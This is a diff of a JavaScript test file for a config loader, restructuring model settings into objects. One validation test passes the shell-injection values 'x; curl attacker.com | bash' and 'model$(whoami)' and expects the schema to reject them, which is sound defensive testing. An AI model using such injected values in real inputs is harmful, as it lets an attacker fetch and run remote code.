@@ -58,8 +58,8 @@ test("loadConfig: user config only merges with defaults", () => {
   try {
     const config = loadConfig(dir);
     assert.equal(config.verbose, true);
-    assert.equal(config.models.claude, "claude-sonnet-4-5-20250929");
-    assert.equal(config.models.gemini, "gemini-3.1-pro-preview"); // default preserved
+    assert.equal(config.models.claude.model, "claude-sonnet-4-5-20250929");
+    assert.equal(config.models.gemini.model, "gemini-3.1-pro-preview"); // default preserved
   } finally {
     if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
     else process.env.XDG_CONFIG_HOME = origXdg;
@@ -157,14 +157,12 @@ test("resolveConfig: ppcommit llm settings can be overridden", () => {
     ppcommit: {
       enableLlm: false,
       llmServiceUrl: "https://example.com/v1",
-      llmApiKeyEnv: "MY_LLM_API_KEY",
-      llmModel: "my-model",
+      llmModelRef: "claude",
     },
   });
   assert.equal(config.ppcommit.enableLlm, false);
   assert.equal(config.ppcommit.llmServiceUrl, "https://example.com/v1");
-  assert.equal(config.ppcommit.llmApiKeyEnv, "MY_LLM_API_KEY");
-  assert.equal(config.ppcommit.llmModel, "my-model");
+  assert.equal(config.ppcommit.llmModelRef, "claude");
 });
 
 test("userConfigPath: respects XDG_CONFIG_HOME", () => {
@@ -204,28 +202,31 @@ test("CoderConfigSchema rejects model names with shell injection characters", ()
   assert.throws(
     () =>
       CoderConfigSchema.parse({
-        models: { gemini: "x; curl attacker.com | bash" },
+        models: { gemini: { model: "x; curl attacker.com | bash" } },
       }),
     /Invalid model name/,
   );
   assert.throws(
     () =>
       CoderConfigSchema.parse({
-        models: { claude: "model$(whoami)" },
+        models: { claude: { model: "model$(whoami)" } },
       }),
     /Invalid model name/,
   );
   // Valid model names should pass
   const parsed = CoderConfigSchema.parse({
-    models: { gemini: "gemini-2.5-flash", claude: "claude-opus-4-6" },
+    models: {
+      gemini: { model: "gemini-2.5-flash" },
+      claude: { model: "claude-opus-4-6" },
+    },
   });
-  assert.equal(parsed.models.gemini, "gemini-2.5-flash");
-  assert.equal(parsed.models.claude, "claude-opus-4-6");
+  assert.equal(parsed.models.gemini.model, "gemini-2.5-flash");
+  assert.equal(parsed.models.claude.model, "claude-opus-4-6");
 });
 
 test("CoderConfigSchema accepts model names with slashes and dots", () => {
   const parsed = CoderConfigSchema.parse({
-    models: { gemini: "models/gemini-2.5-flash-preview" },
+    models: { gemini: { model: "models/gemini-2.5-flash-preview" } },
   });
-  assert.equal(parsed.models.gemini, "models/gemini-2.5-flash-preview");
+  assert.equal(parsed.models.gemini.model, "models/gemini-2.5-flash-preview");
 });
